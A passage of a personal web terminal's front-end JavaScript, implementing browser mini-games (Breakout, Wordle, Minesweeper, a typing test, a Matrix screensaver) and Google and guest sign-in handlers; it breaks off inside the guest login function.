                    const hitPoint = (ball.x - (paddle + currentPW / 2)) / (currentPW / 2);
                    ball.vx = hitPoint * 8; // Increased horizontal influence
                    // Ensure ball doesn't get stuck horizontally
                    if (Math.abs(ball.vx) < 1) ball.vx = ball.vx < 0 ? -2 : 2;
                    SoundManager.playBloop(400, 0.05);
                }

                bricks.forEach(b => {
                    if (!b.alive) return;
                    if (ball.x + BR > b.x && ball.x - BR < b.x + BW && ball.y + BR > b.y && ball.y - BR < b.y + BH) {
                        b.hp--; ball.vy *= -1;
                        SoundManager.playBloop(600 + Math.random() * 200, 0.05);
                        
                        if (b.hp <= 0) {
                            b.alive = false; score += 10 * level;
                            if (Math.random() < 0.15) {
                                const pu = PU_TYPES[Math.floor(Math.random() * PU_TYPES.length)];
                                powerups.push({ x: b.x + BW/2, y: b.y, type: pu.type, label: pu.label, color: pu.color });
                            }
                        } else {
                            b.color = BCOLORS[Math.floor(Math.random() * BCOLORS.length)]; // Crack effect
                        }

                        if (d.accel) {
                            ball.vx *= d.accel; ball.vy *= d.accel;
                            const spd = Math.sqrt(ball.vx**2 + ball.vy**2);
                            const maxSpd = 10 + level * 2;
                            if (spd > maxSpd) { ball.vx = ball.vx/spd*maxSpd; ball.vy = ball.vy/spd*maxSpd; }
                        }
                        const el = document.getElementById('brk-score');
                        if (el) el.textContent = score;
                    }
                });

                if (ball.y > 310) balls.splice(bi, 1);
            });

            if (balls.length === 0) {
                lives--;
                SoundManager.playBloop(150, 0.1);
                const healthBar = document.getElementById('brk-health');
                if (healthBar) healthBar.style.width = (lives / d.maxLives * 100) + '%';
                if (lives <= 0) { 
                    dead = true; 
                    submitScore('breakout', score);
                    showLeaderboard('breakout');
                } else {
                    balls = [{ x: 200, y: 230, vx: d.startVX * (1 + level*0.1), vy: d.startVY * (1 + level*0.1) }];
                    powerups = [];
                    currentPW = d.PW; wideTimer = 0;
                }
            }

            powerups.forEach((pu, pi) => {
                pu.y += 2 * dt;
                if (pu.y > 270 && pu.y < 285 && pu.x > paddle && pu.x < paddle + currentPW) {
                    powerups.splice(pi, 1);
                    SoundManager.playBloop(800, 0.1);
                    if (pu.type === 'multi') {
                        balls.push({ x: balls[0]?.x || 200, y: 230, vx: -3, vy: -4 }, { x: balls[0]?.x || 200, y: 230, vx: 3, vy: -4 });
                    } else if (pu.type === 'wide') {
                        currentPW = d.PW * 1.6; wideTimer = 10000;
                    } else if (pu.type === 'slow') {
                        balls.forEach(b => { b.vx *= 0.7; b.vy *= 0.7; });
                    }
                }
                if (pu.y > 310) powerups.splice(pi, 1);
            });

            if (bricks.every(b => !b.alive)) { 
                level++;
                const lEl = document.getElementById('brk-level');
                if (lEl) lEl.textContent = level;
                initBricks();
                SoundManager.playBloop(1000, 0.2);
            }
        }

        // Draw bg based on level
        ctx.fillStyle = level % 2 === 0 ? '#0a0a1a' : '#050510';
        ctx.fillRect(0, 0, 400, 300);
        ctx.strokeStyle = 'rgba(0,255,255,0.04)'; ctx.lineWidth = 1;
        for (let x = 0; x <= 400; x += 25) { ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,300); ctx.stroke(); }
        for (let y = 0; y <= 300; y += 25) { ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(400,y); ctx.stroke(); }

        bricks.forEach(b => {
            if (!b.alive) return;
            ctx.fillStyle = b.color; ctx.fillRect(b.x, b.y, BW, BH);
            ctx.fillStyle = 'rgba(255,255,255,0.15)'; ctx.fillRect(b.x, b.y, BW, 3);
        });

        powerups.forEach(pu => {
            ctx.fillStyle = pu.color;
            ctx.font = 'bold 14px monospace'; ctx.textAlign = 'center';
            ctx.fillText(pu.label, pu.x, pu.y);
            ctx.textAlign = 'left';
        });

        ctx.fillStyle = '#0ff'; ctx.shadowBlur = 8; ctx.shadowColor = '#0ff';
        ctx.fillRect(paddle, 275, currentPW, PH);
        balls.forEach(b => { ctx.beginPath(); ctx.arc(b.x, b.y, BR, 0, Math.PI * 2); ctx.fill(); });
        ctx.shadowBlur = 0;

        if (dead) {
            ctx.fillStyle = 'rgba(255,0,0,0.5)'; ctx.fillRect(0, 0, 400, 300);
            ctx.fillStyle = '#fff'; ctx.font = 'bold 24px monospace'; ctx.textAlign = 'center';
            ctx.fillText('SYSTEM FAILURE', 200, 150);
            ctx.font = '14px monospace'; ctx.fillText('CLICK TO RETRY', 200, 190);
            ctx.textAlign = 'left';
            nexusCanvas.onclick = () => { nexusCanvas.onclick = null; launchBreakout(difficulty); };
        }

        breakoutRaf = requestAnimationFrame(frame);
    }
    breakoutRaf = requestAnimationFrame(frame);
}

function stopBreakout() { 
    cancelAnimationFrame(breakoutRaf); 
    breakoutActive = false; 
    nexusCanvas.onmousemove = null;
    nexusCanvas.ontouchmove = null;
}

// =============================================================
//  WORDLE (Tech Edition)
// =============================================================
let wordleActive = false, _wordleKey = null;

function startWordle() {
    stopAllGames();
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'NEXUS DECRYPT';
    nexusCanvas.style.display = 'none';

    guiContent.innerHTML = `
        <div style="text-align:center;padding:10px 0;">
            <div style="color:#0ff;letter-spacing:3px;font-size:0.8rem;margin-bottom:16px;">SELECT DATABANK</div>
            <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
                <button class="gui-btn word-cat" data-cat="tech"   style="border-color:#0ff;color:#0ff;">IT & TECH</button>
                <button class="gui-btn word-cat" data-cat="code"   style="border-color:#0f0;color:#0f0;">CODING</button>
                <button class="gui-btn word-cat" data-cat="hard"   style="border-color:#f0f;color:#f0f;">6-LETTER SECRETS</button>
            </div>
            <p style="color:#555;font-size:0.68rem;margin-top:14px;">Decrypt the secure hash. Type your guess.</p>
        </div>`;

    guiContent.querySelectorAll('.word-cat').forEach(btn => {
        btn.addEventListener('click', () => launchWordle(btn.dataset.cat));
    });
}

function launchWordle(category) {
    stopAllGames();
    wordleActive = true;
    
    const WORDS = {
        tech: ['LINUX','APPLE','MACRO','BOARD','POWER','DRIVE','CABLE','LASER','FIBER','MODEM','ROUTER','CLOUD','PIXEL'],
        code: ['ARRAY','FLOAT','REACT','FETCH','AWAIT','ASYNC','CONST','WHILE','CATCH','THROW','SCOPE','MERGE','DEBUG'],
        hard: ['SERVER','CLIENT','DOMAIN','HACKER','KERNEL','MEMORY','GIGABIT','UPTIME','SYSTEM','ROUTER']
    };
    
    const wordList = WORDS[category] || WORDS.tech;
    const targetWord = wordList[Math.floor(Math.random() * wordList.length)];
    const wordLen = targetWord.length;
    const maxGuesses = 6;

    let guesses = [];
    let currentGuess = "";
    let gameOver = false;

    guiContent.innerHTML = `
        <div style="display:flex;flex-direction:column;align-items:center;padding-top:10px;">
            <div id="word-grid" style="display:grid;grid-template-rows:repeat(${maxGuesses}, 40px);gap:5px;margin-bottom:15px;"></div>
            <div id="word-msg" style="color:#f55;font-size:0.75rem;height:15px;"></div>
            <button class="gui-btn" id="word-retry" style="display:none;margin-top:10px;" onclick="launchWordle('${category}')">RETRY DECRYPTION</button>
        </div>
    `;

    function renderGrid() {
        const grid = document.getElementById('word-grid');
        if (!grid) return;
        grid.style.gridTemplateColumns = `repeat(${wordLen}, 40px)`;
        let html = '';
        for (let i = 0; i < maxGuesses; i++) {
            const guess = guesses[i] || (i === guesses.length ? currentGuess.padEnd(wordLen, ' ') : ' '.repeat(wordLen));
            for (let j = 0; j < wordLen; j++) {
                let bg = 'transparent', color = '#fff', border = '#333';
                if (i < guesses.length) {
                    const char = guess[j];
                    if (targetWord[j] === char) { bg = '#0f0'; color = '#000'; border = '#0f0'; }
                    else if (targetWord.includes(char)) { bg = '#ff0'; color = '#000'; border = '#ff0'; }
                    else { bg = '#333'; color = '#888'; border = '#333'; }
                } else if (i === guesses.length && guess[j] !== ' ') {
                    border = '#0ff';
                }
                html += `<div style="display:flex;align-items:center;justify-content:center;border:1px solid ${border};background:${bg};color:${color};font-weight:bold;font-size:1.2rem;">${guess[j]}</div>`;
            }
        }
        grid.innerHTML = html;
    }

    renderGrid();

    _wordleKey = (e) => {
        if (!wordleActive || gameOver) return;
        if (e.key === 'Backspace') { currentGuess = currentGuess.slice(0, -1); renderGrid(); SoundManager.playBloop(300, 0.05); return; }
        if (e.key === 'Enter' && currentGuess.length === wordLen) {
            guesses.push(currentGuess);
            if (currentGuess === targetWord) {
                gameOver = true;
                document.getElementById('word-msg').style.color = '#0f0';
                document.getElementById('word-msg').textContent = 'DECRYPTION SUCCESSFUL';
                document.getElementById('word-retry').style.display = 'block';
                SoundManager.playBloop(1000, 0.2);
                submitScore('wordle', (maxGuesses - guesses.length + 1) * 100);
            } else if (guesses.length === maxGuesses) {
                gameOver = true;
                document.getElementById('word-msg').textContent = `LOCKED OUT. WORD WAS: ${targetWord}`;
                document.getElementById('word-retry').style.display = 'block';
                SoundManager.playBloop(150, 0.2);
            } else {
                currentGuess = "";
                SoundManager.playBloop(800, 0.1);
            }
            renderGrid();
            return;
        }
        if (/^[a-zA-Z]$/.test(e.key) && currentGuess.length < wordLen) {
            currentGuess += e.key.toUpperCase();
            renderGrid();
            SoundManager.playBloop(400, 0.05);
        }
    };
    document.removeEventListener('keydown', _wordleKey); document.addEventListener('keydown', _wordleKey);
}

function stopWordle() {
    wordleActive = false;
    if (_wordleKey) { document.removeEventListener('keydown', _wordleKey); _wordleKey = null; }
}

// =============================================================
//  MINESWEEPER
// =============================================================
let mineActive = false;
const MINE_ROWS = 9, MINE_COLS = 9, MINE_COUNT = 10;
let mineGrid = [], mineRevealed = [], mineFlagged = [], mineOver = false, mineWon = false, mineFirst = true;

function startMinesweeper() {
    stopAllGames();
    mineActive = true;
    mineOver = false; mineWon = false; mineFirst = true;
    mineGrid = Array.from({length: MINE_ROWS}, () => Array(MINE_COLS).fill(0));
    mineRevealed = Array.from({length: MINE_ROWS}, () => Array(MINE_COLS).fill(false));
    mineFlagged  = Array.from({length: MINE_ROWS}, () => Array(MINE_COLS).fill(false));

    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'NEXUS MINESWEEPER';
    nexusCanvas.style.display = 'none';
    renderMinesweeper();
    printToTerminal('Minesweeper — left-click to reveal, right-click to flag. First click is always safe.', 'sys-msg');
}

function placeMines(safeR, safeC) {
    let placed = 0;
    while (placed < MINE_COUNT) {
        const r = Math.floor(Math.random() * MINE_ROWS);
        const c = Math.floor(Math.random() * MINE_COLS);
        if (mineGrid[r][c] !== -1 && !(Math.abs(r - safeR) <= 1 && Math.abs(c - safeC) <= 1)) {
            mineGrid[r][c] = -1;
            placed++;
        }
    }
    for (let r = 0; r < MINE_ROWS; r++) for (let c = 0; c < MINE_COLS; c++) {
        if (mineGrid[r][c] === -1) continue;
        let n = 0;
        for (let dr = -1; dr <= 1; dr++) for (let dc = -1; dc <= 1; dc++) {
            const nr = r + dr, nc = c + dc;
            if (nr >= 0 && nr < MINE_ROWS && nc >= 0 && nc < MINE_COLS && mineGrid[nr][nc] === -1) n++;
        }
        mineGrid[r][c] = n;
    }
}

function mineFlood(r, c) {
    if (r < 0 || r >= MINE_ROWS || c < 0 || c >= MINE_COLS) return;
    if (mineRevealed[r][c] || mineFlagged[r][c]) return;
    mineRevealed[r][c] = true;
    if (mineGrid[r][c] === 0) for (let dr=-1;dr<=1;dr++) for (let dc=-1;dc<=1;dc++) mineFlood(r+dr,c+dc);
}

function renderMinesweeper() {
    const NCOLORS = ['','#0ff','#0f0','#f55','#55f','#f80','#0ff','#f0f','#aaa'];
    const flagsLeft = MINE_COUNT - mineFlagged.flat().filter(Boolean).length;

    let html = `<div style="text-align:center;font-size:0.75rem;color:#888;margin-bottom:8px;">
        💣 ${flagsLeft} mines remaining${mineOver ? ' — <span style="color:#f55">BOOM</span>' : ''}${mineWon ? ' — <span style="color:#0f0">YOU WIN!</span>' : ''}
    </div><table style="border-collapse:collapse;margin:0 auto;">`;

    for (let r = 0; r < MINE_ROWS; r++) {
        html += '<tr>';
        for (let c = 0; c < MINE_COLS; c++) {
            const revealed = mineRevealed[r][c];
            const flagged  = mineFlagged[r][c];
            const val      = mineGrid[r][c];
            let bg = revealed ? '#1a1a2e' : '#2a2a3e';
            let color = '#0ff', text = '';
            let border = revealed ? '1px solid #111' : '1px solid #444';
            if (revealed) {
                if (val === -1) { bg = '#500'; color = '#f55'; text = '💣'; }
                else if (val > 0) { color = NCOLORS[val]; text = val; }
            } else if (flagged) { text = '🚩'; }
            const style = `width:30px;height:30px;text-align:center;vertical-align:middle;background:${bg};border:${border};color:${color};font-size:0.8rem;font-weight:bold;cursor:${mineOver||mineWon?'default':'pointer'};user-select:none;`;
            html += `<td style="${style}" onclick="mineClick(${r},${c})" oncontextmenu="mineFlag(event,${r},${c})">${text}</td>`;
        }
        html += '</tr>';
    }
    html += '</table>';
    if (mineOver || mineWon) html += `<div style="text-align:center;margin-top:10px;"><button onclick="startMinesweeper()" style="background:transparent;border:1px solid #0ff;color:#0ff;padding:6px 14px;font-family:'Fira Code',monospace;cursor:pointer;border-radius:4px;">New Game</button></div>`;

    guiContent.innerHTML = html;
}

window.mineClick = function(r, c) {
    if (mineOver || mineWon || mineRevealed[r][c] || mineFlagged[r][c]) return;
    if (mineFirst) { placeMines(r, c); mineFirst = false; }
    if (mineGrid[r][c] === -1) {
        mineRevealed[r][c] = true;
        mineOver = true;
        // Reveal all mines
        for (let i=0;i<MINE_ROWS;i++) for (let j=0;j<MINE_COLS;j++) if (mineGrid[i][j]===-1) mineRevealed[i][j]=true;
        renderMinesweeper();
        printToTerminal('💥 Detonated. Better luck next time.', 'sys-msg');
        return;
    }
    mineFlood(r, c);
    const safe = MINE_ROWS * MINE_COLS - MINE_COUNT;
    if (mineRevealed.flat().filter(Boolean).length >= safe) {
        mineWon = true;
        printToTerminal('💣 All mines cleared. Nice work.', 'conn-ok');
    }
    renderMinesweeper();
};

window.mineFlag = function(e, r, c) {
    e.preventDefault();
    if (mineOver || mineWon || mineRevealed[r][c]) return;
    mineFlagged[r][c] = !mineFlagged[r][c];
    renderMinesweeper();
};

// =============================================================
//  TYPING SPEED TEST
// =============================================================
const TYPE_PHRASES = [
    'the quick brown fox jumps over the lazy dog near the riverbank',
    'packets travel across networks at the speed of light through fiber optic cables',
    'every system has a vulnerability if you know exactly where to look for it',
    'xavier scott built this terminal so you could talk to an ai without a search bar',
    'code is just instructions that tell machines what to do until they do it wrong',
    'a clean network is a fast network and a fast network is a happy homelab',
    'debug twice deploy once or just push to prod and hope nothing catches fire',
    'the best way to learn something is to break it and then figure out how to fix it',
    'open source software runs most of the internet and nobody really talks about that',
    'trust the process unless the process is a shell script you wrote at midnight',
    'security is not a product it is a process that never really ends',
    'any sufficiently advanced technology is indistinguishable from magic',
    'first make it work then make it right then make it fast in that order',
];

let typeTestActive = false;
let typePhrase = '', typeStart = 0, typeTimerInterval = null;
let typeErrors = 0, typeCharsTyped = 0;

function startTypingTest() {
    stopAllGames();
    typeTestActive = true;
    typePhrase = TYPE_PHRASES[Math.floor(Math.random() * TYPE_PHRASES.length)];
    typeStart = 0;
    typeErrors = 0;
    typeCharsTyped = 0;

    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'TYPING TEST';
    nexusCanvas.style.display = 'none';

    renderTypeTest('');
    printToTerminal('Typing test started — type in the input bar below', 'sys-msg');
    input.value = '';
    input.focus();
}

function renderTypeTest(typed) {
    const target = typePhrase;
    // Build character-by-character highlighted target
    let chars = '';
    for (let i = 0; i < target.length; i++) {
        if (i < typed.length) {
            if (typed[i] === target[i]) {
                chars += `<span style="color:#0f0">${target[i] === ' ' ? '&nbsp;' : target[i]}</span>`;
            } else {
                chars += `<span style="color:#f55;text-decoration:underline">${target[i] === ' ' ? '·' : target[i]}</span>`;
            }
        } else if (i === typed.length) {
            chars += `<span style="color:#0ff;border-left:2px solid #0ff">${target[i] === ' ' ? '&nbsp;' : target[i]}</span>`;
        } else {
            chars += `<span style="color:#444">${target[i] === ' ' ? '&nbsp;' : target[i]}</span>`;
        }
    }

    const elapsed = typeStart ? ((Date.now() - typeStart) / 1000) : 0;
    const elSec = elapsed.toFixed(1) + 's';
    const wordsTyped = typed.trim().split(/\s+/).filter(w => w).length;
    const wpm = elapsed > 1 ? Math.round(wordsTyped / (elapsed / 60)) : 0;
    const progress = Math.round((typed.length / target.length) * 100);
    const pct = Math.min(100, progress);

    guiContent.innerHTML = `
        <div style="margin-bottom:10px;">
            <div style="display:flex;justify-content:space-between;font-size:0.7rem;color:#555;margin-bottom:4px;">
                <span>PROGRESS</span><span>${pct}%</span>
            </div>
            <div style="height:3px;background:#111;border-radius:2px;">
                <div style="height:3px;width:${pct}%;background:#0ff;border-radius:2px;transition:width 0.1s;"></div>
            </div>
        </div>
        <div style="font-size:0.88rem;line-height:1.9;letter-spacing:0.03em;word-break:break-word;margin-bottom:14px;font-family:'Fira Code',monospace;">${chars}</div>
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;text-align:center;">
            <div style="background:#0a0a1a;border:1px solid #1a1a2e;padding:8px;border-radius:4px;">
                <div id="type-timer-val" style="font-size:1.4rem;font-weight:bold;color:#0ff;">${elSec}</div>
                <div style="font-size:0.62rem;color:#555;letter-spacing:1px;margin-top:2px;">TIME</div>
            </div>
            <div style="background:#0a0a1a;border:1px solid #1a1a2e;padding:8px;border-radius:4px;">
                <div id="type-wpm-val" style="font-size:1.4rem;font-weight:bold;color:#f0f;">${wpm}</div>
                <div style="font-size:0.62rem;color:#555;letter-spacing:1px;margin-top:2px;">WPM</div>
            </div>
            <div style="background:#0a0a1a;border:1px solid #1a1a2e;padding:8px;border-radius:4px;">
                <div id="type-err-val" style="font-size:1.4rem;font-weight:bold;color:${typeErrors > 0 ? '#f55' : '#0f0'};">${typeErrors}</div>
                <div style="font-size:0.62rem;color:#555;letter-spacing:1px;margin-top:2px;">ERRORS</div>
            </div>
        </div>
        <p style="font-size:0.7rem;color:#333;text-align:center;margin-top:10px;">Type in the input bar · Esc to cancel</p>`;
}

function tickTypeTimer() {
    if (!typeTestActive || !typeStart) return;
    const elapsed = ((Date.now() - typeStart) / 1000).toFixed(1) + 's';
    const el = document.getElementById('type-timer-val');
    if (el) el.textContent = elapsed;
    // Update live WPM
    const typed = input.value;
    const wordsTyped = typed.trim().split(/\s+/).filter(w => w).length;
    const secs = (Date.now() - typeStart) / 1000;
    const wpm = secs > 1 ? Math.round(wordsTyped / (secs / 60)) : 0;
    const wEl = document.getElementById('type-wpm-val');
    if (wEl) wEl.textContent = wpm;
}

function checkTypingTest(typed) {
    if (!typeTestActive) return false;
    if (typeStart === 0) {
        typeStart = Date.now();
        clearInterval(typeTimerInterval);
        typeTimerInterval = setInterval(tickTypeTimer, 100);
    }

    // Count errors
    typeErrors = 0;
    for (let i = 0; i < typed.length; i++) {
        if (typed[i] !== typePhrase[i]) typeErrors++;
    }

    renderTypeTest(typed);

    if (typed === typePhrase) {
        const elapsed = (Date.now() - typeStart) / 1000;
        const wpm = Math.round((typePhrase.split(' ').length) / (elapsed / 60));
        const accuracy = Math.round(((typePhrase.length - typeErrors) / typePhrase.length) * 100);
        clearInterval(typeTimerInterval);
        typeTestActive = false;

        // Show final result overlay in GUI
        guiContent.innerHTML += `
            <div style="margin-top:12px;padding:12px;border:2px solid #0ff;text-align:center;background:#0a0f1a;">
                <div style="color:#0ff;font-size:1.1rem;font-weight:bold;letter-spacing:2px;">COMPLETE</div>
                <div style="margin-top:6px;font-size:0.85rem;color:#fff;">${wpm} WPM &nbsp;·&nbsp; ${accuracy}% accuracy &nbsp;·&nbsp; ${elapsed.toFixed(1)}s</div>
                ${wpm > 80 ? '<div style="color:#0f0;font-size:0.75rem;margin-top:4px;">Elite typist 🔥</div>' : wpm > 50 ? '<div style="color:#ff0;font-size:0.75rem;margin-top:4px;">Nice speed!</div>' : '<div style="color:#888;font-size:0.75rem;margin-top:4px;">Keep practicing.</div>'}
            </div>`;
        printToTerminal(`Typing test complete: ${wpm} WPM · ${accuracy}% accuracy · ${elapsed.toFixed(1)}s`, 'conn-ok');
        return true;
    }
    return false;
}

// =============================================================
//  MATRIX SCREENSAVER
// =============================================================
let matrixSaverActive = false;


function startMatrixSaver() {
    stopAllGames();
    matrixSaverActive = true;
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'MATRIX';
    guiContent.innerHTML = '<p style="font-size:0.72rem;color:#0f0;text-align:center;">Press any key or close to exit</p>';
    nexusCanvas.style.display = 'block';
    nexusCanvas.width = 400; nexusCanvas.height = 360;
    const ctx = nexusCanvas.getContext('2d');
    const cols = Math.floor(400 / 14);
    const drops = Array(cols).fill(1);
    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&';

    function frame() {
        if (!matrixSaverActive) return;
        ctx.fillStyle = 'rgba(0,0,0,0.07)';
        ctx.fillRect(0, 0, 400, 360);
        ctx.fillStyle = '#0f0';
        ctx.font = '13px monospace';
        drops.forEach((y, i) => {
            const ch = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillStyle = y === 1 ? '#fff' : '#0f0';
            ctx.fillText(ch, i * 14, y * 14);
            if (y * 14 > 360 && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
        matrixSaverFrame = requestAnimationFrame(frame);
    }
    frame();

    const exitHandler = () => { stopMatrixSaver(); document.removeEventListener('keydown', exitHandler); };
    document.addEventListener('keydown', exitHandler);
}

function stopMatrixSaver() {
    matrixSaverActive = false;
    cancelAnimationFrame(matrixSaverFrame);
}

// =============================================================
//  STOP ALL GAMES HELPER
// =============================================================
function stopAllGames() {
    // Kill all animation frames safely
    if (window.pongRaf) window.cancelAnimationFrame(window.pongRaf);
    if (window.flappyFrame) window.cancelAnimationFrame(window.flappyFrame);
    if (window.breakoutRaf) window.cancelAnimationFrame(window.breakoutRaf);
    if (window.breakoutRaf) window.cancelAnimationFrame(window.breakoutRaf);
    if (window.invadersRaf) window.cancelAnimationFrame(window.invadersRaf);
    if (window.snakeRaf) window.cancelAnimationFrame(window.snakeRaf);
    if (window.matrixSaverFrame) window.cancelAnimationFrame(window.matrixSaverFrame);
    
    // Nuke canvas to kill all event listeners
    if (typeof nexusCanvas !== 'undefined' && nexusCanvas) {
        const cleanCanvas = nexusCanvas.cloneNode(true);
        nexusCanvas.parentNode.replaceChild(cleanCanvas, nexusCanvas);
        nexusCanvas = cleanCanvas;
    }
    
    // Explicitly call sub-stops
    if (typeof stopPong === 'function') stopPong();
    if (typeof stopSnake === 'function') stopSnake();
    if (typeof stopWordle === 'function') stopWordle();
    if (typeof stopFlappy === 'function') stopFlappy();
    if (typeof stopBreakout === 'function') stopBreakout();
    if (typeof stopInvaders === 'function') stopInvaders();
    
    // Global state resets
    invadersActive = false;
    breakoutActive = false;
    flappyActive = false;
    snakeActive = false;
    wordleActive = false;
    mineActive = false;
    stopSnake();
    stopWordle();
    stopMatrixSaver();
    stopFlappy();
    stopBreakout();
    stopInvaders();
    mineActive = false;
    breachActive = false;
    typeTestActive = false;
    wordleActive = false; // Add this
    clearInterval(typeTimerInterval);
    clearInterval(monitorInterval);

    // Ensure terminal input is focused and cleared
    if (input) {
        input.value = '';
        input.focus();
    }

    // TOTAL WIPE of canvas listeners to prevent 'game jumping'
    nexusCanvas.onclick = null;
    nexusCanvas.onmousedown = null;
    nexusCanvas.onmousemove = null;
    nexusCanvas.ontouchstart = null;
    nexusCanvas.ontouchmove = null;
    nexusCanvas.ontouchend = null;

    // Clear any active game intervals/frames not caught by sub-functions
    cancelAnimationFrame(pongRaf);
    cancelAnimationFrame(flappyFrame);
    cancelAnimationFrame(breakoutRaf);
    cancelAnimationFrame(invadersRaf);
}

// =============================================================
//  GOOGLE AUTHENTICATION
// =============================================================
let _googleClientID = '616205887439-s1l0out61vlu0l81307q9g64oai3gnur.apps.googleusercontent.com'; 
let _authInited = false;
let _googleInited = false; // Add this to prevent double-init warning

async function initGoogleAuth() {
    if (_authInited) return;
    renderAuthSection();

    const setupGoogle = () => {
        const hasGoogle = !!(window.google && window.google.accounts);
        if (!hasGoogle || _googleInited) return _googleInited;

        google.accounts.id.initialize({
            client_id: _googleClientID,
            callback: handleCredentialResponse,
            ux_mode: 'popup',
            context: 'signin',
            itp_support: true,
            auto_select: true
        });
        _googleInited = true;


        const sideEl = document.getElementById('sidebar-g_id_signin');
        if (sideEl && sideEl.children.length === 0) {
            google.accounts.id.renderButton(sideEl, { type: 'standard', shape: 'rectangular', theme: 'filled_blue', text: 'signin_with', size: 'medium' });
        }
        const wallEl = document.getElementById('g_id_signin_wall');
        if (wallEl && wallEl.children.length === 0) {
            google.accounts.id.renderButton(wallEl, { type: 'standard', shape: 'rectangular', theme: 'filled_blue', text: 'signin_with', size: 'large' });
        }

        _authInited = true;
        return true;
    };

    // Try immediately with default ID
    if (setupGoogle()) {
        console.log("[AUTH] Init with local ID");
    }

    // Update ID from server in background
    fetch(`${API_BASE}/api/config`)
        .then(r => r.json())
        .then(cfg => {
            if (cfg.google_client_id && cfg.google_client_id !== _googleClientID) {
                console.log("[AUTH] Updating Client ID from server...");
                _googleClientID = cfg.google_client_id;
                _authInited = false; // re-init with new ID
                setupGoogle();
            }
        })
        .catch(() => { /* keep using default */ });

    // Fallback: If script isn't loaded yet, wait for it
    let attempts = 0;
    const poll = setInterval(() => {
        attempts++;
        if (setupGoogle() || attempts > 20) clearInterval(poll); 
    }, 200); // Fast poll
}

function renderAuthSection() {
    const authSection = document.getElementById('auth-section');
    if (!authSection) return;
    
    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
    
    if (nexusUser && nexusUser.name) {
        const isGoogle = !!nexusUser.email && nexusUser.email !== 'guest@local';
        const avatarHtml = nexusUser.picture 
            ? `<img src="${nexusUser.picture}" class="auth-avatar" alt="User">`
            : `<div class="auth-avatar-initials">${nexusUser.name[0].toUpperCase()}</div>`;
            
        authSection.innerHTML = `
            <div class="auth-user-card">
                ${avatarHtml}
                <div class="auth-info">
                    <div class="auth-name">${nexusUser.name}</div>
                    <div class="auth-email">${isGoogle ? nexusUser.email : 'LOCAL IDENTITY'}</div>
                </div>
                <div style="display:flex; flex-direction:column; gap:4px;">
                    <button class="auth-logout-btn" onclick="logout()" title="Sign out">✕</button>
                    <button class="auth-logout-btn" style="background:rgba(255,0,0,0.1); border-color:#f55; color:#f55; font-size:8px; width:18px; height:18px; line-height:1;" onclick="clearAllHistory()" title="Clear memory">M</button>
                </div>
            </div>
        `;
    } else {
        authSection.innerHTML = `
            <div class="auth-signin-wrapper">
                <div class="auth-signin-label">MEMBER ACCESS</div>
                <div id="sidebar-g_id_signin" style="display:flex; justify-content:center;"></div>
            </div>
        `;
    }
}

async function handleCredentialResponse(response) {
    console.log("[AUTH] Received Google Credential. Validating with backend...");
    const statusMsg = document.getElementById('auth-status-msg');
    if (statusMsg) statusMsg.textContent = "[UPLINK] Synchronizing identity...";

    try {
        const res = await fetch(`${API_BASE}/auth/google`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ credential: response.credential })
        });
        const data = await res.json();
        if (data.ok) {
            localStorage.setItem('nexus_user_data', JSON.stringify(data)); if(data.is_owner) localStorage.setItem('nexus_owner', 'true');
            revealTerminal(data.name);
            renderAuthSection();
        } else {
            console.error("[AUTH] Backend validation failed:", data.error);
            if (statusMsg) statusMsg.textContent = `[ERROR] Identity mismatch: ${data.error}`;
        }
    } catch(e) { 
        if (statusMsg) statusMsg.textContent = "[ERROR] Connection failure.";
    }
}

// Expose globally
window.handleCredentialResponse = handleCredentialResponse;
window.revealTerminal = revealTerminal;
window.logout = logout;

function logout() {
    if (!confirm("Terminate session and sign out?")) return;
    localStorage.removeItem('nexus_user_data');
    location.reload(); 
}

function revealTerminal(name) {
    const overlay = document.getElementById('auth-screen');
    const monitor = document.getElementById('main-monitor');
    const terms   = document.getElementById('terms-modal');
    if (overlay) overlay.style.display = 'none';
    if (monitor) monitor.style.display = 'flex';
    if (terms)   terms.style.display   = 'none';
    document.body.classList.remove('auth-locked');

    // Ensure DOM references and listeners are set up now that UI is visible
    output = document.getElementById('terminal-output');
    input  = document.getElementById('terminal-input');
    setupInputListeners();

    if (name) updateUserIdentity(name);
    renderAuthSection();
    logPrompt(`[PROTOCOL] User '${name}' acknowledged Terms of Access and established uplink.`);
    
    connectWS();
    connectStats();
    updateClientStats();
    setInterval(updateClientStats, 5000);
    
    printToTerminal(`[AUTH] Identity Verified: ${name}. Uplink established.`, 'conn-ok');
}

window.showTerms = () => { 
    const check = document.getElementById('terms-check');
    const btn   = document.getElementById('agree-btn');
    if (check) check.checked = false;
    if (btn)   btn.disabled  = true;
    document.getElementById('terms-modal').style.display = 'flex'; 
};

window.showTermsFromWall = () => {
    window.showTerms();
};

window.hideTerms = () => { document.getElementById('terms-modal').style.display = 'none'; };

async function submitGuestAuth() {
    const err   = document.getElementById('guest-error');
    const btn   = document.getElementById('agree-btn');

    let name = 'Guest';

    console.log(`[AUTH] Attempting guest login via ${API_BASE}`);
    if (btn) btn.textContent = 'ESTABLISHING LINK...';
    if (btn) btn.disabled = true;
    if (err) err.textContent = '';

    try {
        const res = await fetch(`${API_BASE}/auth/guest`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name: name })
        });
        console.log(`[AUTH] Response status: ${res.status}`);
        const data = await res.json();
        console.log(`[AUTH] Response data:`, data);
        if (data.ok) {
            localStorage.setItem('nexus_user_data', JSON.stringify(data));
            revealTerminal(data.name);
            renderAuthSection();
        } else {
            if (err) err.textContent = data.error || 'Server error';
            if (btn) btn.textContent = 'I AGREE & ENTER';
            if (btn) btn.disabled = false;
        }
    } catch(e) {
